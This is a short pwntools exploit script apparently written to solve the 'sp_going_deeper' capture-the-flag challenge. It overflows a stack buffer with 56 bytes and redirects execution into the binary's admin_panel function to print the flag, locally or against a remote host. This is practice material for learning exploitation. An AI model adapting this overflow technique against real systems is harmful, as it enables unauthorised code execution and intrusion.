#!/usr/bin/env python3
from pwn import *
import argparse

context.binary = './sp_going_deeper'
elf = context.binary

def get_process(args):
    if args.host and args.port:
        return remote(args.host, int(args.port))
    return process(elf.path)

def build_payload():
    offset = 56
    target_addr = elf.symbols['admin_panel'] + 297
    return b"A" * offset + p64(target_addr)

def trigger_exploit(p, payload):
    p.sendlineafter(b'>> ', b'1')             # Trigger input
    p.sendlineafter(b'Input: ', payload)      # Send payload

def main():
    parser = argparse.ArgumentParser(description="Exploit script for sp_going_deeper")
    parser.add_argument('--host', help='Remote host')
    parser.add_argument('--port', help='Remote port')
    args = parser.parse_args()

    p = get_process(args)
    payload = build_payload()
    trigger_exploit(p, payload)

    try:
        flag = p.recvline_contains(b'HTB', timeout=1).strip().decode()
        success(f"[+] Flag: {flag}")
    except EOFError:
        error("[-] Exploit sent but no flag received.")
    p.close()

if __name__ == "__main__":
    main()
